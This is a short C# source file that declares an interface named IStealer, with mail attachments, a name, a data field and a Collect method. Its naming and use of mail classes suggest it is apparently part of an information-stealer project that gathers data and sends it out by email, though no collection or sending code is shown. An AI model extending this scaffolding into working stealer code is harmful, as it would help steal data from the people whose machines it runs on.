using System.Collections.Generic;
using System.Net.Mail;

namespace sub.Util.Misc
{
    interface IStealer
    {
        List<Attachment> Attachments { get; set; }
        string Name { get; set; }
        string Data { get; set; }
        void Collect();
    }
}